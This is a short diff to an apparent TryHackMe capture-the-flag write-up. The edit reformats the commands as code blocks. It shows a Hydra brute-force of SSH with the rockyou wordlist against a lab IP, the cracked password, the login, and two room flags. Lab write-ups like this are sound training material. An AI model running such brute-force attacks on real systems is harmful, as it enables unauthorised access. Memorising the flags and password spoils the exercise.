@@ -28,7 +28,7 @@ Flag 1: THM{2673a7dd116de68e85c48ec0b1f2612e}
 
 ## SSH Brute Force (Hydra)
 
-hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.134.146 -t 4 ssh  
+```bash hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.49.134.146 -t 4 ssh```  
 
 Password found: butterfly  
 
@@ -36,10 +36,10 @@ Password found: butterfly
 
 ## SSH Access & Flag 2
 
-ssh molly@10.49.134.146  
+```bash ssh molly@10.49.134.146```  
 Password: butterfly  
 
-ls  
-cat flag2.txt  
+```bash ls```  
+```cat flag2.txt```  
 
 Flag 2: THM{c8eeb0468febbadea859baeb33b2541b}  
